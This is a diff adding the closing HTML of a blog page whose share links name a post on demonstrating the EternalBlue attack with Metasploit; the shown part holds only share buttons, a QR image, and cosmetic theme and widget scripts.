+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.deops.cn/posts/af5d3de9/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《MSF框架实现"永恒之蓝"的攻击演示》 — Echo's Blog&url=http://www.deops.cn/posts/af5d3de9/&via=http://www.deops.cn" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.deops.cn/posts/af5d3de9/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAAB1UlEQVR42u3aQW7DMAxEUd//0s7WgCNlZijKDvC1KtrEfuxiIFI6Dnmdl3X9zf0z98+Pvnt/wrIFFy7cMvecrhFlXsb8aXp5X0qCCxfuRu4oMebRoweWUuTcABcu3DdzlY1OVgBcuHD/kTtvh5RNz9YggwsXbpnrBtC8mcmGLIt7Nbhw4Ra4+gv6fm6Z78KFCzfintHS255sPDp8L1y4cLdw3dBxhyBuCkmtEVy4cJu52QvmDU/WIElXNODChbuRm31ZuaLhjll/NEVw4cJ9lKsfl+rDlOxa55ctDly4cLdz623M2sOVo7KfggsXbgM32wa5QxB96wMXLtynuG6XocRcNnKVggwuXLgNXHtkKbcxlWsc0qAELly4bdxK3OgRVp922v9RuHDhlrnZqEJvivS2yrgnAhcu3Dbu2ge5F7xKR61w4cJt41Ye6h64Kpsq45AVLly4bdy1R6FuFIaNEFy4cJu5p7nC6DGvekh7Mbhw4bZx9aUU4CLc8uDChbuT64ZXpSS9MOn8By5cuM1c/apEli31RgsuXLjv5LpNkVukFJpw4cJ9GVcpJvtre+7ChQs34mYh5TZI7rHr8JAVLly4zVz9oXOWe2lDj9FwvgsXLtyE+wFVhkP6V1YnWwAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/06/29");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Echo");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+<script src="/live2d-widget/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2d-widget/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2d-widget/assets/hijiki.model.json"},"display":{"position":"left","width":50,"height":100,"hOffset":50},"mobile":{"show":false},"log":false});</script></body>
+</html>
